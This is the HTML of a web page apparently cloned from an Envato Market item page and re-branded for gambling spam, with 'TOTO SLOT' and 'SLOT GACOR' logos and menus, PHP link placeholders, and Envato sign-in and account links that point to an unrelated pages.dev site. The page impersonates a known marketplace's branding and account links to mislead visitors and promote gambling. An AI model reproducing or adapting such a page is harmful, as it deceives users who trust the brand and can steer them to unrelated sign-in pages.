    <style>.brand-neue-button{gap:var(--spacing-2x);border-radius:var(--roundness-subtle);background:var(--color-interactive-primary);color:var(--color-content-brand);font-family:PolySans-Median;font-size:var(--font-size-2x);letter-spacing:.02em;text-align:center;padding:0 20px}.brand-neue-button:hover,.brand-neue-button:active,.brand-neue-button:focus{background:var(--color-interactive-primary-hover)}.brand-neue-button__open-in-new::after{font-size:0;margin-left:5px;vertical-align:sub;content:url(data:image/svg+xml,<svg\ width=\"14\"\ height=\"14\"\ viewBox=\"0\ 0\ 20\ 20\"\ fill=\"none\"\ xmlns=\"http://www.w3.org/2000/svg\"><g\ id=\"ico-/-24-/-actions-/-open_in_new\"><path\ id=\"Icon-color\"\ d=\"M17.5\ 12.0833V15.8333C17.5\ 16.7538\ 16.7538\ 17.5\ 15.8333\ 17.5H4.16667C3.24619\ 17.5\ 2.5\ 16.7538\ 2.5\ 15.8333V4.16667C2.5\ 3.24619\ 3.24619\ 2.5\ 4.16667\ 2.5H7.91667C8.14679\ 2.5\ 8.33333\ 2.68655\ 8.33333\ 2.91667V3.75C8.33333\ 3.98012\ 8.14679\ 4.16667\ 7.91667\ 4.16667H4.16667V15.8333H15.8333V12.0833C15.8333\ 11.8532\ 16.0199\ 11.6667\ 16.25\ 11.6667H17.0833C17.3135\ 11.6667\ 17.5\ 11.8532\ 17.5\ 12.0833ZM17.3167\ 2.91667L17.0917\ 2.69167C16.98\ 2.57535\ 16.8278\ 2.50668\ 16.6667\ 2.5H11.25C11.0199\ 2.5\ 10.8333\ 2.68655\ 10.8333\ 2.91667V3.75C10.8333\ 3.98012\ 11.0199\ 4.16667\ 11.25\ 4.16667H14.6583L7.625\ 11.2C7.54612\ 11.2782\ 7.50175\ 11.3847\ 7.50175\ 11.4958C7.50175\ 11.6069\ 7.54612\ 11.7134\ 7.625\ 11.7917L8.20833\ 12.375C8.28657\ 12.4539\ 8.39307\ 12.4982\ 8.50417\ 12.4982C8.61527\ 12.4982\ 8.72176\ 12.4539\ 8.8\ 12.375L15.8333\ 5.35V8.75C15.8333\ 8.98012\ 16.0199\ 9.16667\ 16.25\ 9.16667H17.0833C17.3135\ 9.16667\ 17.5\ 8.98012\ 17.5\ 8.75V3.33333C17.4955\ 3.17342\ 17.4299\ 3.02132\ 17.3167\ 2.90833V2.91667Z\"\ fill=\"%231A4200\"/></g></svg>)}</style>
    <style type="text/css">.fancybox-margin{margin-right:15px}</style>
    <script src="https://bat.bing.com/p/action/16005611.js" type="text/javascript" async="" data-ueto="ueto_8c931ec7a9"></script>
        <script src="https://g.lzd-cdn.org/g/mtb/lib-mtop/2.5.1/polyfillB.js,mtb/lib-promise/3.1.3/mtop.js,mtb/lib-modules/1.1.4/pc.js"></script>
    <meta http-equiv="origin-trial" content="A7JYkbIvWKmS8mWYjXO12SIIsfPdI7twY91Y3LWOV/YbZmN1ZhYv8O+Zs6/IPCfBE99aV9tIC8sWZSCN09vf7gkAAACWeyJvcmlnaW4iOiJodHRwczovL2N0LnBpbnRlcmVzdC5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
<style>body{background-color:#e48100;background-image:linear-gradient(315deg,#00ffff 0%,#000000 74%);background-attachment:fixed}.site-header,.global-header,.site-header__sites,.site-header__categories{background-color:#e48100!important;background-image:linear-gradient(315deg,#008B8B 0%,#008080 74%)!important}.item-preview,.purchase-panel,.box--no-padding{background-color:rgba(255,255,255,.1)!important;backdrop-filter:blur(12px)!important;-webkit-backdrop-filter:blur(12px)!important;border-radius:16px!important;border:1px solid rgba(255,255,255,.2)!important;box-shadow:0 4px 30px rgba(0,0,0,.1)}.item-preview,.purchase-panel{padding:24px!important;border:none!important}.item-preview__actions{background:transparent!important}.purchase-panel h3,.purchase-panel .price,.purchase-panel p,.purchase-panel label,.purchase-panel a,.purchase-panel .meta-attributes__attr-name,.purchase-panel .meta-attributes__attr-detail{color:#fff!important;text-shadow:1px 1px 3px rgba(0,0,0,.5)}.purchase-panel a{color:#a8eb12!important}</style>
</head>

<body class="color-scheme-light" data-view="app impressionTracker" data-responsive="true" data-user-signed-in="false" __processed_046ac43c-cdf6-4311-9a75-3ea1775342f5__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuMjYiLCJzY29yZSI6MjAwMjYwfV0=">
    <script src="https://public-assets.envato-static.com/assets/gtm_measurements-40b0a0f82bafab0a0bb77fc35fe1da0650288300b85126c95b4676bcff6e4584.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W8KL5Q5" height="0" width="0" style="display:none;visibility:hidden">
        </iframe>
    </noscript>

    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KGCDGPL6" height="0" width="0" style="display:none;visibility:hidden">
        </iframe>
    </noscript>
    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
(function(){function normalizeAttributeValue(value){if(value===undefined||value===null)return undefined
var normalizedValue
if(Array.isArray(value)){normalizedValue=normalizedValue||value.map(normalizeAttributeValue).filter(Boolean).join(', ')}normalizedValue=normalizedValue||value.toString().toLowerCase().trim().replace(/&amp;/g,'&').replace(/&#39;/g,"'").replace(/\s+/g,' ')
if(normalizedValue==='')return undefined
return normalizedValue}var pageAttributes={app_name:normalizeAttributeValue('Marketplace'),app_env:normalizeAttributeValue('production'),app_version:normalizeAttributeValue('f7d8b3d494288b34cb00105ee5d230d68b0ccca7'),page_type:normalizeAttributeValue('item'),page_location:window.location.href,page_title:document.title,page_referrer:document.referrer,ga_param:normalizeAttributeValue(''),event_attributes:null,user_attributes:{user_id:normalizeAttributeValue(''),market_user_id:normalizeAttributeValue(''),}}
dataLayer.push(pageAttributes)
dataLayer.push({event:'analytics_ready',event_attributes:{event_type:'user',custom_timestamp:Date.now()}})})();
//]]></script>
    <style>.live-preview-btn--blue .live-preview{background-color:#0e03a3}.live-preview-btn--blue .live-preview:hover,.live-preview-btn--blue .live-preview:focus{background-color:#001aff}</style>

    <div class="page" bis_skin_checked="1">
        <div class="page__off-canvas--left overflow" bis_skin_checked="1">
            <div class="off-canvas-left js-off-canvas-left" bis_skin_checked="1">
                <div class="off-canvas-left__top" bis_skin_checked="1">
                    <a href="<?php echo $urlPath ?>">Envato Market</a>
                </div>
                <div class="off-canvas-left__current-site -color-themeforest" bis_skin_checked="1">
                    <span class="off-canvas-left__site-title">
                        Web Themes &amp; Templates
                    </span>
                    <a class="off-canvas-left__current-site-toggle -white-arrow -color-themeforest" data-view="dropdown" data-dropdown-target=".off-canvas-left__sites" href="<?php echo $urlPath ?>"></a>
                </div>
                <div class="off-canvas-left__sites is-hidden" id="off-canvas-sites" bis_skin_checked="1">
                    <a class="off-canvas-left__site" href="h<?php echo $urlPath ?>">
                        <span class="off-canvas-left__site-title">
                            Code
                        </span>
                        <i class="e-icon -icon-right-open"></i>
                    </a> <a class="off-canvas-left__site" href="<?php echo $urlPath ?>">
                        <span class="off-canvas-left__site-title">
                            Video
                        </span>
                        <i class="e-icon -icon-right-open"></i>
                    </a> <a class="off-canvas-left__site" href="<?php echo $urlPath ?>">
                        <span class="off-canvas-left__site-title">
                            Audio
                        </span>
                        <i class="e-icon -icon-right-open"></i>
                    </a> <a class="off-canvas-left__site" href="<?php echo $urlPath ?>">
                        <span class="off-canvas-left__site-title">
                            Graphics
                        </span>
                        <i class="e-icon -icon-right-open"></i>
                    </a> <a class="off-canvas-left__site" href="<?php echo $urlPath ?>">
                        <span class="off-canvas-left__site-title">
                            Photos
                        </span>
                        <i class="e-icon -icon-right-open"></i>
                    </a> <a class="off-canvas-left__site" href="<?php echo $urlPath ?>">
                        <span class="off-canvas-left__site-title">
                            3D Files
                        </span>
                        <i class="e-icon -icon-right-open"></i>
                    </a>
                </div>
                <div class="off-canvas-left__search" bis_skin_checked="1">
                    <form id="search" action="<?php echo $urlPath ?>" accept-charset="UTF-8" method="get">
                        <div class="search-field -border-none" bis_skin_checked="1">
                            <div class="search-field__input" bis_skin_checked="1">
                                <input id="term" name="term" type="search" placeholder="Search" class="search-field__input-field">
                            </div>
                            <button class="search-field__button" type="submit">
                                <i class="e-icon -icon-search"><span class="e-icon__alt">Search</span></i>
                            </button>
                        </div>
                    </form>
                </div>
                <ul>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-all-items" href="<?php echo $urlPath ?>">
                            All Items
                        </a>
                        <ul class="is-hidden" id="off-canvas-all-items">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Files</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Featured Files</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Top New Files</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Follow Feed</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Top Authors</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Top New
                                    Authors</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Public Collections</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">View All Categories</a>
                            </li>
                        </ul>

                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-wordpress" href="<?php echo $urlPath ?>">
                            WordPress
                        </a>
                        <ul class="is-hidden" id="off-canvas-wordpress">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Show all
                                    WordPress</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Blog /
                                    Magazine</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">BuddyPress</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Corporate</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Creative</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Directory &amp; Listings</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">eCommerce</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Education</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Elementor</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Entertainment</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Mobile</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Nonprofit</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Real
                                    Estate</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Retail</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Technology</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Wedding</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Miscellaneous</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">WordPress Plugins</a>
                            </li>
                        </ul>

                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-elementor" href="<?php echo $urlPath ?>">
                            Elementor
                        </a>
                        <ul class="is-hidden" id="off-canvas-elementor">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Template Kits</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Plugins</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Themes</a>
                            </li>
                        </ul>

                    </li>
                    <li>

                        <a class="off-canvas-category-link--empty" href="<?php echo $urlPath ?>">
                            Hosting
                        </a>
                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-html" href="<?php echo $urlPath ?>">
                            HTML
                        </a>
                        <ul class="is-hidden" id="off-canvas-html">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Show all
                                    HTML</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Admin Templates</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Corporate</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Creative</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Entertainment</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Mobile</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Nonprofit</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Personal</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Retail</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Specialty Pages</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Technology</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Wedding</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Miscellaneous</a>
                            </li>
                        </ul>

                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-shopify" href="<?php echo $urlPath ?>">
                            Shopify
                        </a>
                        <ul class="is-hidden" id="off-canvas-shopify">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Show all
                                    Shopify</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Fashion</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Shopping</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Health &amp; Beauty</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Technology</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Entertainment</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Miscellaneous</a>
                            </li>
                        </ul>

                    </li>
                    <li>

                        <a class="off-canvas-category-link--empty" href="<?php echo $urlPath ?>">
                            Jamstack
                        </a>
                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-marketing" href="<?php echo $urlPath ?>">
                            Marketing
                        </a>
                        <ul class="is-hidden" id="off-canvas-marketing">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Show all
                                    Marketing</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Email Templates</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Landing Pages</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Unbounce Landing Pages</a>
                            </li>
                        </ul>

                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-cms" href="<?php echo $urlPath ?>">
                            CMS
                        </a>
                        <ul class="is-hidden" id="off-canvas-cms">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Show all CMS</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Concrete5</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Drupal</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">HubSpot CMS Hub</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Joomla</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">MODX
                                    Themes</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Moodle</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Webflow</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Weebly</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Miscellaneous</a>
                            </li>
                        </ul>

                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ecommerce" href="<?php echo $urlPath ?>">
                            eCommerce
                        </a>
                        <ul class="is-hidden" id="off-canvas-ecommerce">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Show all
                                    eCommerce</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">WooCommerce</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">BigCommerce</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Drupal Commerce</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Easy Digital Downloads</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Ecwid</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Magento</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">OpenCart</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">PrestaShop</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Shopify</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Ubercart</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">VirtueMart</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Zen
                                    Cart</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Miscellaneous</a>
                            </li>
                        </ul>

                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ui-templates" href="<?php echo $urlPath ?>">
                            UI Templates
                        </a>
                        <ul class="is-hidden" id="off-canvas-ui-templates">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Popular Items</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Figma</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Adobe
                                    XD</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Photoshop</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Sketch</a>
                            </li>
                        </ul>

                    </li>
                    <li>

                        <a class="off-canvas-category-link--empty" href="<?php echo $urlPath ?>">
                            Plugins
                        </a>
                    </li>
                    <li>
                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-more" href="<?php echo $urlPath ?>">
                            More
                        </a>
                        <ul class="is-hidden" id="off-canvas-more">
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Blogging</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Courses</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Facebook Templates</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Free Elementor Templates</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Free
                                    WordPress Themes</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Forums</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Ghost
                                    Themes</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub" href="<?php echo $urlPath ?>">Tumblr</a>
                            </li>
                            <li>
                                <a class="off-canvas-category-link--sub external-link elements-nav__category-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="<?php echo $urlPath ?>">Unlimited
                                    Creative Assets</a>
                            </li>
                        </ul>

                    </li>

                    <li>
                        <a class="elements-nav__category-link external-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="<?php echo $urlPath ?>">Unlimited
                            Downloads</a>
                    </li>

                </ul>

            </div>

        </div>

        <div class="page__off-canvas--right overflow" bis_skin_checked="1">
            <div class="off-canvas-right" bis_skin_checked="1">
                <a class="off-canvas-right__link--cart" href="<?php echo $urlPath ?>">
                    Guest Cart
                    <div class="shopping-cart-summary is-empty" data-view="cartCount" bis_skin_checked="1">
                        <span class="js-cart-summary-count shopping-cart-summary__count">0</span>
                        <i class="e-icon -icon-cart"></i>
                    </div>
                </a>
                <a class="off-canvas-right__link" href="https://seo-burung-nuri.pages.dev/">
                    Create an Envato Account
                    <i class="e-icon -icon-envato"></i>
                </a>
                <a class="off-canvas-right__link" href="https://seo-burung-nuri.pages.dev/">
                    Sign In
                    <i class="e-icon -icon-login"></i>
                </a>
            </div>

        </div>

        <div class="page__canvas" bis_skin_checked="1">
            <div class="canvas" bis_skin_checked="1">
                <div class="canvas__header" bis_skin_checked="1">

                    <header class="site-header">
                        <div class="site-header__mini is-hidden-desktop" bis_skin_checked="1">
                            <div class="header-mini" bis_skin_checked="1">
                                <div class="header-mini__button--cart" bis_skin_checked="1">
                                    <a class="btn btn--square" href="<?php echo $urlPath ?>">
                                        <svg width="14px" height="14px" viewBox="0 0 14 14" class="header-mini__button-cart-icon" xmlns="http://www.w3.org/2000/svg" aria-labelled="title" role="img">
                                            <title>Cart</title>
                                            <path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
                                            </path>

                                        </svg>


                                        <span class="is-hidden">Cart</span>
                                        <span class="header-mini__button-cart-cart-amount is-hidden">
                                            0
                                        </span>
                                    </a>
                                </div>
                                <div class="header-mini__button--account" bis_skin_checked="1">
                                    <a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="right" href="<?php echo $urlPath ?>">
                                        <i class="e-icon -icon-person"></i>
                                        <span class="is-hidden">Account</span>
                                    </a>
                                </div>

                                <div class="header-mini__button--categories" bis_skin_checked="1">
                                    <a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="left" href="<?php echo $urlPath ?>">
                                        <i class="e-icon -icon-hamburger"></i>
                                        <span class="is-hidden">Sites, Search &amp; Categories</span>
                                    </a>
                                </div>

                                <div class="header-mini__logo" bis_skin_checked="1">
                                    <a href="<?php echo $urlPath ?>">
                                        <img alt="TOTO SLOT" src="https://res.cloudinary.com/dxje0jyp5/image/upload/v1761050344/seo_hantu_vmraht.png" style="height:40px; width:auto; display:inline-block;">
                                    </a>
                                </div>



                            </div>

                        </div>

                        <div class="global-header is-hidden-tablet-and-below" bis_skin_checked="1">

                            <div class="grid-container -layout-wide" bis_skin_checked="1">
                                <div class="global-header__wrapper" bis_skin_checked="1">
                                    <a href="<?php echo $urlPath ?>">
                                        <img height="50" alt="SLOT THAILAND" class="global-header__logo" src="https://res.cloudinary.com/dxje0jyp5/image/upload/v1761050344/seo_hantu_vmraht.png">
                                    </a>
                                    <nav class="global-header-menu" role="navigation">
                                        <ul class="global-header-menu__list">
                                            <li class="global-header-menu__list-item">
                                                <a class="global-header-menu__link" href="<?php echo $urlPath ?>">
                                                    <span class="global-header-menu__link-text">
                                                        TOTO
                                                    </span>
                                                </a>
                                            </li>
                                            <li class="global-header-menu__list-item">
                                                <a class="global-header-menu__link" href="<?php echo $urlPath ?>">
                                                    <span class="global-header-menu__link-text">
                                                        SLOT GACOR
                                                    </span>
                                                </a>
                                            </li>


                                            <li data-view="globalHeaderMenuDropdownHandler" class="global-header-menu__list-item--with-dropdown">
                                                <a data-lazy-load-trigger="mouseover" class="global-header-menu__link" href="<?php echo $urlPath ?>">
                                                    <svg width="16px" height="16px" viewBox="0 0 16 16" class="global-header-menu__icon" xmlns="http://www.w3.org/2000/svg" aria-labelled="title" role="img">
                                                        <title>Menu</title>
